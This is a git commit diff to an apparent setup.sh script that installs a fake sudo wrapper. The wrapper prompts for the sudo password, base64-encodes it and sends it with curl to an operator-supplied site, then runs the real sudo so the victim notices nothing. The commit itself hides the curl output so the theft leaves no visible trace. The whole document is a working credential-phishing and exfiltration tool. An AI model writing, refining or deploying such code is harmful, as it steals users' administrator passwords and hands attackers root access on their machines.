1594e74524999e5e12c96b48401ff488e9e22d50
Kamran <83241419+NarmakTwo@users.noreply.github.com>
2022-10-11 20:28:24 -0400

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -9,7 +9,7 @@ echo 'Please execute this script using source.'
 echo 'Press enter to continue.'
 read
 read -p 'Site (include https:// or http://) <<< '
-echo "read -s -p \"[sudo] password for \$USER: \"; pass=\$REPLY; pass64=\$(echo \"\$pass\" | base64); curl $REPLY/\$pass64; echo; sudo \"\$@\" <<< \"\$REPLY\"" > sudo.sh
+echo "read -s -p \"[sudo] password for \$USER: \"; pass=\$REPLY; pass64=\$(echo \"\$pass\" | base64); curl $REPLY/\$pass64 > /dev/null 2>&1; echo; sudo \"\$@\" <<< \"\$REPLY\"" > sudo.sh
 echo '>>> sudo.sh created'
 cp $(which sudo) ./.realsudo
 function sudo {
